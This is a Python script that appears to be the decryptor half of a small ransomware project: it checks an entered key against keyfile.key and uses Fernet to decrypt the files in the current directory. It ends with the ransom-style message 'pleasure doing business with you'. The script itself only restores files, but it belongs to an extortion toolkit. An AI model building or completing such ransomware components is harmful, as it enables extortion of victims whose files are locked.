#! /Library/Frameworks/Python.framework/Versions/3.12/bin/python3


import os
from cryptography.fernet import Fernet


# gets decryptor key
if os.path.isfile("keyfile.key"):
    keyinp = input("Input the key: ")
    keyinp = keyinp.encode()
    keydata = open("keyfile.key", "rb").read()

    if keydata == keyinp:

        f = Fernet(keydata)
	
        # get files

        files = os.listdir()

        for file in files:
            if (
                file == "ransomewarev1.py"
                or file == "get-pip.py"
                or file == "decryptor.py"
                or file == ".git"
                or file == "keyfile.key"
            ):
                continue
            # get
            rdata = open(file, "rb").read()

            dec_data = f.decrypt(rdata)

            # write
            wfile = open(file, "wb")
            wfile.write(dec_data)
            wfile.close()
        print("Your files have been successfully decrypted, pleasure doing business with you")                
    else:
       print("invalid key")
    
